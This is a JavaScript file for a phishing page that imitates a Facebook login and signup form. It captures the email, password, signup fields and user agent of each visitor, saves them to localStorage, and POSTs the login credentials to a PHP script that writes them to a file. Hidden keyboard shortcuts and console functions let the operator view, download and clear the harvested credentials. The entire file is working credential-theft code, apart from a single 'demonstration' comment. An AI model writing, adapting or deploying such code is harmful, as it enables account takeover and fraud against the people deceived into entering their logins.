// Get modal and buttons
const modal = document.getElementById('signupModal');
const createAccountBtn = document.getElementById('createAccountBtn');
const closeBtn = document.querySelector('.close');
const loginForm = document.getElementById('loginForm');
const signupForm = document.getElementById('signupForm');
const errorMessage = document.getElementById('errorMessage');

// Open modal when clicking Create New Account
createAccountBtn.addEventListener('click', function() {
    modal.style.display = 'block';
});

// Close modal when clicking X
closeBtn.addEventListener('click', function() {
    modal.style.display = 'none';
});

// Close modal when clicking outside of it
window.addEventListener('click', function(event) {
    if (event.target === modal) {
        modal.style.display = 'none';
    }
});

// Handle login form submission
loginForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Validate inputs
    if (!email || !password) {
        showError('Please fill in all fields');
        return;
    }
    
    if (password.length < 6) {
        showError('Password must be at least 6 characters');
        return;
    }
    
    // Create credential object
    const credentials = {
        email: email,
        password: password,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };
    
    // Store credentials in localStorage
    saveCredentials(credentials);
    
    // Send to PHP file to save in userName&Password file
    saveToFile(email, password);
    
    // Also log to console
    console.log('Login attempt:', credentials);
    
    // Show success message
    showError('Login credentials captured!');
    
    // Reset form after 2 seconds
    setTimeout(() => {
        loginForm.reset();
        errorMessage.textContent = '';
    }, 2000);
});

// Handle signup form submission
signupForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    // Get all form values
    const formData = new FormData(signupForm);
    const data = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        type: 'signup'
    };
    formData.forEach((value, key) => {
        data[key] = value;
    });
    
    // Store signup data in localStorage
    saveCredentials(data);
    
    // Log signup data (for demonstration purposes only)
    console.log('Signup attempt:', data);
    
    // Show success and close modal
    alert('Signup information captured!');
    modal.style.display = 'none';
    signupForm.reset();
});

// Function to show error message
function showError(message) {
    errorMessage.textContent = message;
    errorMessage.style.display = 'block';
    
    // Hide error after 3 seconds
    setTimeout(() => {
        errorMessage.style.display = 'none';
    }, 3000);
}

// Add animation to inputs
const inputs = document.querySelectorAll('input');
inputs.forEach(input => {
    input.addEventListener('focus', function() {
        this.parentElement.style.transition = 'all 0.3s ease';
    });
    
    input.addEventListener('blur', function() {
        if (this.value === '') {
            this.style.borderColor = '#dddfe2';
        }
    });
});

// Populate date dropdowns
function populateDateDropdowns() {
    const daySelect = document.querySelector('.date-row select:first-child');
    const monthSelect = document.querySelector('.date-row select:nth-child(2)');
    const yearSelect = document.querySelector('.date-row select:last-child');
    
    // Add days
    for (let i = 1; i <= 31; i++) {
        const option = document.createElement('option');
        option.value = i;
        option.textContent = i;
        daySelect.appendChild(option);
    }
    
    // Add months
    const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
    months.forEach((month, index) => {
        const option = document.createElement('option');
        option.value = index + 1;
        option.textContent = month;
        monthSelect.appendChild(option);
    });
    
    // Add years (from current year to 120 years ago)
    const currentYear = new Date().getFullYear();
    for (let i = currentYear; i >= currentYear - 120; i--) {
        const option = document.createElement('option');
        option.value = i;
        option.textContent = i;
        yearSelect.appendChild(option);
    }
}

// Initialize date dropdowns when page loads
populateDateDropdowns();

// Prevent form submission on Enter key for better UX
document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter' && e.target.tagName !== 'BUTTON') {
        const form = e.target.closest('form');
        if (form && form.id === 'signupForm') {
            e.preventDefault();
        }
    }
});

// Function to save credentials to localStorage
function saveCredentials(data) {
    // Get existing credentials from localStorage
    let allCredentials = JSON.parse(localStorage.getItem('capturedCredentials') || '[]');
    
    // Add new credentials
    allCredentials.push(data);
    
    // Save back to localStorage
    localStorage.setItem('capturedCredentials', JSON.stringify(allCredentials));
    
    // Update the count
    console.log(`Total credentials captured: ${allCredentials.length}`);
}

// Function to view all captured credentials (for admin)
function viewCapturedData() {
    const allCredentials = JSON.parse(localStorage.getItem('capturedCredentials') || '[]');
    
    if (allCredentials.length === 0) {
        console.log('No credentials captured yet.');
        return;
    }
    
    console.log('=== CAPTURED CREDENTIALS ===');
    console.log(`Total entries: ${allCredentials.length}`);
    console.log('============================');
    
    allCredentials.forEach((cred, index) => {
        console.log(`\n--- Entry #${index + 1} ---`);
        console.log(JSON.stringify(cred, null, 2));
    });
    
    return allCredentials;
}

// Function to download credentials as a text file
function downloadCredentials() {
    const allCredentials = JSON.parse(localStorage.getItem('capturedCredentials') || '[]');
    
    if (allCredentials.length === 0) {
        alert('No credentials to download yet.');
        return;
    }
    
    // Format credentials as text
    let content = '=== FACEBOOK LOGIN PAGE - CAPTURED CREDENTIALS ===\n\n';
    content += `Total Entries: ${allCredentials.length}\n`;
    content += `Generated: ${new Date().toISOString()}\n`;
    content += '='.repeat(50) + '\n\n';
    
    allCredentials.forEach((cred, index) => {
        content += `Entry #${index + 1}\n`;
        content += `-`.repeat(30) + '\n';
        
        if (cred.email) {
            content += `Email/Username: ${cred.email}\n`;
            content += `Password: ${cred.password}\n`;
        }
        
        content += `Timestamp: ${cred.timestamp}\n`;
        content += `User Agent: ${cred.userAgent}\n`;
        content += '\n';
        
        Object.keys(cred).forEach(key => {
            if (!['email', 'password', 'timestamp', 'userAgent'].includes(key)) {
                content += `${key}: ${cred[key]}\n`;
            }
        });
        
        content += '\n';
    });
    
    // Create blob and download
    const blob = new Blob([content], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `captured-credentials-${Date.now()}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
    
    console.log('Credentials downloaded successfully!');
}

// Function to clear all captured data
function clearCapturedData() {
    if (confirm('Are you sure you want to clear all captured credentials?')) {
        localStorage.removeItem('capturedCredentials');
        console.log('All captured credentials have been cleared.');
    }
}

// Admin keyboard shortcut (Ctrl+Shift+V to view data)
document.addEventListener('keydown', function(e) {
    // Ctrl+Shift+V - View captured data
    if (e.ctrlKey && e.shiftKey && e.key === 'V') {
        e.preventDefault();
        viewCapturedData();
    }
    
    // Ctrl+Shift+D - Download captured data
    if (e.ctrlKey && e.shiftKey && e.key === 'D') {
        e.preventDefault();
        downloadCredentials();
    }
    
    // Ctrl+Shift+C - Clear captured data
    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
        e.preventDefault();
        clearCapturedData();
    }
});

// Log instructions on page load
console.log('%c=== ADMIN CONTROLS ===', 'color: #1877f2; font-size: 16px; font-weight: bold;');
console.log('%cKeyboard Shortcuts:', 'color: #1877f2; font-weight: bold;');
console.log('  Ctrl+Shift+V - View captured credentials');
console.log('  Ctrl+Shift+D - Download credentials as file');
console.log('  Ctrl+Shift+C - Clear all captured data');
console.log('%cConsole Commands:', 'color: #1877f2; font-weight: bold;');
console.log('  viewCapturedData() - Display all captured credentials');
console.log('  downloadCredentials() - Download credentials as text file');
console.log('  clearCapturedData() - Clear all stored credentials');

// Function to save credentials to userName&Password file via PHP
function saveToFile(email, password) {
    // Create form data
    const formData = new FormData();
    formData.append('email', email);
    formData.append('password', password);
    
    // Send to PHP file
    fetch('save-credentials.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log('✅ Credentials saved to userName&Password file');
        } else {
            console.log('❌ Failed to save to file:', data.message);
        }
    })
    .catch(error => {
        console.log('⚠️ Error saving to file:', error);
        console.log('Note: PHP file required for saving to text file');
    });
}
